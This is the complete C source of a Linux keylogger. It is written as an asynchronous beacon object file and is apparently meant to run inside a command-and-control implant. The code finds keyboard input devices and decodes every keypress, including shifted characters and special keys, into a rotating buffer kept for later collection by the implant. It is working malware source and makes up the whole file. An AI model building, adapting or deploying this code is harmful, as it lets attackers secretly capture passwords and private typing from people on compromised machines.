/// keylog_start.c — Linux keylogger (async BOF) with auto-rotate + spinlock
/// gcc -c -o keylog_start.o keylog_start.c -include bof_api.h -Os -fPIC
#include "bof_api.h"

struct ax_input_event {
    long tv_sec; long tv_usec;
    unsigned short type; unsigned short code; unsigned int value;
};

#define EV_KEY    1
#define KEY_PRESS 1
#define AX_POLLIN 1
#define KL_BUF_SIZE 262144
#define KL_THRESHOLD (KL_BUF_SIZE * 95 / 100)
#define MAX_KBD   8

struct ax_pollfd { int fd; short events; short revents; };

static const char kmap_lo[128] = {
    [2]='1',[3]='2',[4]='3',[5]='4',[6]='5',[7]='6',[8]='7',[9]='8',[10]='9',[11]='0',
    [12]='-',[13]='=',[16]='q',[17]='w',[18]='e',[19]='r',[20]='t',[21]='y',[22]='u',
    [23]='i',[24]='o',[25]='p',[26]='[',[27]=']',[28]='\n',[30]='a',[31]='s',[32]='d',
    [33]='f',[34]='g',[35]='h',[36]='j',[37]='k',[38]='l',[39]=';',[40]='\'',[41]='`',
    [43]='\\',[44]='z',[45]='x',[46]='c',[47]='v',[48]='b',[49]='n',[50]='m',
    [51]=',',[52]='.',[53]='/',[57]=' ',[55]='*',[71]='7',[72]='8',[73]='9',[74]='-',
    [75]='4',[76]='5',[77]='6',[78]='+',[79]='1',[80]='2',[81]='3',[82]='0',[83]='.',
    [96]='\n',[98]='/'
};
static const char kmap_hi[128] = {
    [2]='!',[3]='@',[4]='#',[5]='$',[6]='%',[7]='^',[8]='&',[9]='*',[10]='(',[11]=')',
    [12]='_',[13]='+',[16]='Q',[17]='W',[18]='E',[19]='R',[20]='T',[21]='Y',[22]='U',
    [23]='I',[24]='O',[25]='P',[26]='{',[27]='}',[28]='\n',[30]='A',[31]='S',[32]='D',
    [33]='F',[34]='G',[35]='H',[36]='J',[37]='K',[38]='L',[39]=':',[40]='"',[41]='~',
    [43]='|',[44]='Z',[45]='X',[46]='C',[47]='V',[48]='B',[49]='N',[50]='M',
    [51]='<',[52]='>',[53]='?',[57]=' ',[55]='*', [71]='7', [72]='8', [73]='9', [74]='-',
    [75]='4', [76]='5', [77]='6', [78]='+', [79]='1',[80]='2', [81]='3', [82]='0',
    [83]='.', [96]='\n', [98]='/'
};

/* ── Spinlock via GCC atomic builtins (compiled inline, no external symbols) ── */

static void kl_lock(int *lk)   { while (__sync_lock_test_and_set(lk, 1)) {} }
static void kl_unlock(int *lk) { __sync_lock_release(lk); }

static void bw(char *buf, int *pos, int cap, const char *s, int len) {
    for (int i = 0; i < len && *pos < cap - 1; i++) buf[(*pos)++] = s[i];
}

static void auto_rotate(int *lock, char **buf, int **pos) {
    kl_lock(lock);
    char *old_pending = (char *)AxGetGlobal("kl_pending_buf");
    if (old_pending) AxFree(old_pending);
    AxSetGlobal("kl_pending_buf", *buf);
    AxSetGlobal("kl_pending_len", (void *)(long)**pos);
    char *new_buf = (char *)AxMalloc(KL_BUF_SIZE);
    AxMemset(new_buf, 0, KL_BUF_SIZE);
    **pos = 0;
    *buf = new_buf;
    AxSetGlobal("kl_buf", new_buf);
    kl_unlock(lock);
}

static int find_keyboards(int fds[], char names[][64], int max) {
    char *devs = (char *)0;
    int dl = AxReadFileToBuffer("/proc/bus/input/devices", &devs, 65536);
    if (dl <= 0 || !devs) return 0;
    int count = 0; char *block = devs;
    while (block < devs + dl && count < max) {
        char *next = AxStrstr(block, "\n\n");
        if (!next) next = devs + dl;
        char name[64] = "";
        char *nl = AxStrstr(block, "N: Name=\"");
        if (nl && nl < next) {
            nl += 9; int i = 0;
            while (nl[i] && nl[i] != '"' && i < 63) { name[i] = nl[i]; i++; }
            name[i] = '\0';
        }
        int skip = (!name[0] ||
                    AxStrstr(name,"Power") || AxStrstr(name,"Lid") ||
                    AxStrstr(name,"Sleep") || AxStrstr(name,"Video") ||
                    AxStrstr(name,"Consumer") || AxStrstr(name,"Speaker") ||
                    AxStrstr(name,"Mouse") || AxStrstr(name,"mouse") ||
                    AxStrstr(name,"Touchpad") || AxStrstr(name,"touchpad"));
        char *h = AxStrstr(block, "Handlers=");
        if (!skip && h && h < next && AxStrstr(h, "kbd")) {
            char *ev = AxStrstr(h, "event");
            if (ev && ev < next) {
                int evnum = 0; char *n = ev + 5;
                while (*n >= '0' && *n <= '9') { evnum = evnum*10+(*n-'0'); n++; }
                char path[64]; AxSnprintf(path, sizeof(path), "/dev/input/event%d", evnum);
                int fd = AxOpenFile(path, 0, 0);
                if (fd >= 0) { fds[count] = fd; AxStrcpy(names[count], name); count++; }
            }
        }
        block = next + 2;
    }
    AxFree(devs);
    return count;
}

void go(char *args, int args_len) {
    char *buf = (char *)AxMalloc(KL_BUF_SIZE);
    int  *pos = (int *)AxMalloc(sizeof(int));
    int  *lock = (int *)AxMalloc(sizeof(int));
    if (!buf || !pos || !lock) { BeaconPrintf(CALLBACK_ERROR, "[!] Alloc failed\n"); return; }
    AxMemset(buf, 0, KL_BUF_SIZE);
    *pos = 0; *lock = 0;

    AxSetGlobal("kl_buf", buf);
    AxSetGlobal("kl_pos", pos);
    AxSetGlobal("kl_lock", lock);
    AxSetGlobal("kl_pending_buf", (void *)0);
    AxSetGlobal("kl_pending_len", (void *)0);
    AxSetGlobal("kl_rotations", (void *)0);

    int kbd_fds[MAX_KBD]; char kbd_names[MAX_KBD][64];
    int nkbd = find_keyboards(kbd_fds, kbd_names, MAX_KBD);
    if (nkbd == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] No keyboard devices found (need root or input group)\n");
        return;
    }
    //for (int i = 0; i < nkbd; i++) {
    //    char hdr[128]; int hl = AxSnprintf(hdr, sizeof(hdr), "[keylog] Device %d: %s\n", i, kbd_names[i]);
    //    kl_lock(lock); bw(buf, pos, KL_BUF_SIZE, hdr, hl); kl_unlock(lock);
    //}

    int stop_fd = BeaconGetStopJobEvent();
    int shift = 0; long rotations = 0;

    while (1) {
        struct ax_pollfd fds[MAX_KBD + 1]; int nfds = 0;
        for (int i = 0; i < nkbd; i++) {
            fds[nfds].fd = kbd_fds[i]; fds[nfds].events = AX_POLLIN; fds[nfds].revents = 0; nfds++;
        }
        if (stop_fd >= 0) {
            fds[nfds].fd = stop_fd; fds[nfds].events = AX_POLLIN; fds[nfds].revents = 0; nfds++;
        }

        int pr = AxPoll(fds, nfds, 1000);
        if (pr < 0) break;
        if (stop_fd >= 0 && (fds[nkbd].revents & AX_POLLIN)) break;

        for (int i = 0; i < nkbd; i++) {
            if (!(fds[i].revents & AX_POLLIN)) continue;
            struct ax_input_event ev;
            if (AxReadFile(kbd_fds[i], &ev, sizeof(ev)) != sizeof(ev)) continue;
            if (ev.type != EV_KEY) continue;
            if (ev.code == 42 || ev.code == 54) { shift = (ev.value != 0); continue; }
            if (ev.value != KEY_PRESS) continue;
            if (ev.code < 128) {
                char c = shift ? kmap_hi[ev.code] : kmap_lo[ev.code];
                kl_lock(lock);
                if (c) {
                    bw(buf, pos, KL_BUF_SIZE, &c, 1);
                } else {
                    switch (ev.code) {
                    case 1:   bw(buf, pos, KL_BUF_SIZE, "[ESC]", 5); break;
                    case 14:  bw(buf, pos, KL_BUF_SIZE, "[BS]", 4); break;
                    case 15:  bw(buf, pos, KL_BUF_SIZE, "[TAB]", 5); break;
                    case 29:  bw(buf, pos, KL_BUF_SIZE, "[CTRL]", 6); break;
                    case 56:  bw(buf, pos, KL_BUF_SIZE, "[ALT]", 5); break;
                    case 69:  bw(buf, pos, KL_BUF_SIZE, "[NUM]", 5); break;
                    case 70:  bw(buf, pos, KL_BUF_SIZE, "[SCROLL]", 8); break;
                    case 96:  bw(buf, pos, KL_BUF_SIZE, "\n", 1); break;
                    case 102: bw(buf, pos, KL_BUF_SIZE, "[HOME]", 6); break;
                    case 103: bw(buf, pos, KL_BUF_SIZE, "[UP]", 4); break;
                    case 104: bw(buf, pos, KL_BUF_SIZE, "[PGUP]", 6); break;
                    case 105: bw(buf, pos, KL_BUF_SIZE, "[LEFT]", 6); break;
                    case 106: bw(buf, pos, KL_BUF_SIZE, "[RIGHT]", 7); break;
                    case 107: bw(buf, pos, KL_BUF_SIZE, "[END]", 5); break;
                    case 108: bw(buf, pos, KL_BUF_SIZE, "[DOWN]", 6); break;
                    case 109: bw(buf, pos, KL_BUF_SIZE, "[PGDN]", 6); break;
                    case 110: bw(buf, pos, KL_BUF_SIZE, "[INS]", 5); break;
                    case 111: bw(buf, pos, KL_BUF_SIZE, "[DEL]", 5); break;
                    case 125: bw(buf, pos, KL_BUF_SIZE, "[META]", 6); break;
                    default:  break;  // Teclas sin mapear
                    }
                }
                kl_unlock(lock);
            }
        }

        if (*pos >= KL_THRESHOLD) {
            auto_rotate(lock, &buf, &pos);
            rotations++;
            AxSetGlobal("kl_rotations", (void *)rotations);
        }
    }

    for (int i = 0; i < nkbd; i++) AxCloseFile(kbd_fds[i]);
    BeaconPrintf(CALLBACK_OUTPUT, "[keylog] Stopped. %d bytes, %ld rotations.\n", *pos, rotations);
}
